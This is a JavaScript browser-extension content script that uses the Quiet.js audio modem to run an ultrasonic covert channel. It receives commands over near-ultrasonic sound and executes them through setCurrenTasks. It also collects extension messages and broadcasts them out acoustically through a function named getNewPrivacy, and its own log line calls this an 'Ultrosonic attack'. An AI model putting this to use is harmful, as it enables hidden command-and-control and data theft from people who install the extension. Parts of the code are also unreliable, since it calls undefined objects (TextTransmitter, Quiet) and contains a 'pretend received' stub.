
var Quiet_R,Quiet_S;
var transmiter;
var QuietScript;
const PROFILENAME = "ultrasonic-experimental";
var MESSAGE="";

chrome.runtime.onMessage.addListener(async(message, sender, sendResponse)=> {
    console.log("In conten-scripts: Message received in received:", message.message,sender);
    MESSAGE += "\n"+message.message;
    console.log("In listener:",MESSAGE);
})



(async () => {
    var src = chrome.runtime.getURL("src/CONSTS.js");
    comScript = await import(src);
    COMMANDS=comScript.COMMANDS
    src = chrome.runtime.getURL("src/quiet.js");
    QuietScript = await import(src);

    /**
     * Receiver
     */
    Quiet_R=QuietScript.Quiet;
    Quiet_R.init({
        profilesPrefix: "/",
        memoryInitializerPrefix: "/",
        libfecPrefix: "/",
    });
    var content = new ArrayBuffer(0);
    var sucess = 0;
    var failure = 0;
  
    function onReceive(recvPayload) {
        console.log("In onReceive");
        content = Quiet_R.mergeab(content, recvPayload);
        var command = Quiet_R.ab2str(content)
        //target.textContent = command;
        console.log("Command received:",command);
        sucess++;
        var total = sucess + failure;
        var ratio = failure/total * 100;
        console.log("Packet Loss:\d " + failure + "/" + total + " (" + ratio.toFixed(0) + "%)");
        setCurrenTasks(command); 
    }

    function onReceiverCreateFail(reason) {
        console.log("Receiver failed to create quiet receiver: " + reason);
    }

    function onReceiveFail(num_fails) {
        console.log("onReceiveFail");
        failure  = num_fails ;
        var total = sucess + failure;
        var ratio = failure/total * 100;
        console.log("total:"+total+"\tfailure:"+failure);
        console.log("Receiver We didn't quite get that. It looks like you tried to transmit something. You may need to move the transmitter closer to the receiver and set the volume to 50%.\nPacket Loss: " + failure + "/" + total + " (" + ratio.toFixed(0) + "%)")
    }

    function onQuietReady() {
        console.log("Receiver onQuietReady");
        var profilename = PROFILENAME;
        var receiverOnReceive = function(payload) { onReceive(payload); };
        var receiverOnReceiverCreateFail = function(reason) { onReceiverCreateFail(reason); };
        var receiverOnReceiveFail = function(num_fails) { onReceiveFail(num_fails); };
        Quiet_R.receiver({profile: profilename,
            onReceive: receiverOnReceive,
            onCreateFail: receiverOnReceiverCreateFail,
            onReceiveFail: receiverOnReceiveFail
        });
        //Pretend already received the message
        console.log("Receiver Pretend received the command:"+COMMANDS.NAVGATION);
    }

    function onQuietFail(reason) {
        console.log("onQuietFaile:Receiver Sorry, it looks like there was a problem with this example (" + reason + ")");
      }

    function onDOMLoad() {
        console.log("Receiver onDOMLoad");
        Quiet_R.addReadyCallback(onQuietReady, onQuietFail);
    }
    onDOMLoad();

    console.log("Quiet_R.init finished")

    /**
     * Sender
     */
    Quiet_S=QuietScript.Quiet;
    Quiet_S.init({
        profilesPrefix: "/",
        memoryInitializerPrefix: "/",
        libfecPrefix: "/",
    });
  

    function onTransmitFinish() {
        console.log("Sender onTransmiFinish");
    };

    function getNewPrivacy(payload) {
        if (payload === "") {
            onTransmitFinish();
            return;
        }
        console.log("Sender In onClick:",payload,typeof(payload));
        var abPayload = Quiet.str2ab(payload)
        transmiter.transmit(abPayload);
    };

    function onQuietSenderReady() {
        transmiter = Quiet_S.transmitter({profile: PROFILENAME, onFinish: onTransmitFinish});
        console.log("Sender onQuietReady");
    };

    function onQuietSenderFail(reason) {
        console.log("Sender quiet failed to initialize: " + reason);
    };

    function onDOMSenderLoad() {
        console.log("Sender initiate onDOMLoad");
        Quiet_S.addReadyCallback(onQuietSenderReady, onQuietSenderFail);
    };  
    onDOMSenderLoad();
    return {
        getNewPrivacy: getNewPrivacy
    };
    
  })();

  console.log("Ultrosonic attack finished")




// Function to check if a value is undefined
async function checkTransmitter() {
  if (typeof transmiter !== 'undefined'&& MESSAGE!=="") {
    // Stop the interval when the value is defined
    clearInterval(intervalId);
    console.log("In check:",MESSAGE);
    for(i=0;i<10;i++){
        await TextTransmitter.getNewPrivacy(MESSAGE);
    }
    console.log('Interval stopped');
  }
}

// Set up an interval to call the function every 1 millisecond
const intervalId = setInterval(checkTransmitter, 1);

